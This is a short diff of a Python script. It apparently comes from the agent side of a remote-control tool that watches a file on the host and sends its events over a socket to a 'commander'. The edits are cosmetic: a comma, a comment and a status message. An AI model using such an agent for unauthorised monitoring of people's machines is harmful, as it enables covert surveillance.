@@ -201,17 +201,18 @@ if __name__ == '__main__':
                         signal_queue = queue.Queue()
                         watch_stop_thread = threading.Thread(target=watch_stop_signal,
                                                              args=(client_socket,
-                                                                   signal_queue,),
+                                                                   signal_queue),
                                                              name="Watch_Stop_Signal")
                         watch_stop_thread.daemon = True
                         watch_stop_thread.start()
                         print(constants.THREAD_START_MSG.format(watch_stop_thread.name))
 
-                        # IMPORTANT Send to the commander whenever the file has an event
+                        # Send to the commander whenever the file has an event
                         watch_file(client_socket, file_path, signal_queue)
 
                         # Close Watch Stop Thread
                         watch_stop_thread.join()
+                        print("[+] WATCH FILE STOPPED: Watch file has stopped!")
                     else:
                         print(constants.WATCH_FILE_NOT_EXIST_MSG.format(file_path))
                         client_socket.send((constants.STATUS_FALSE + "/" +
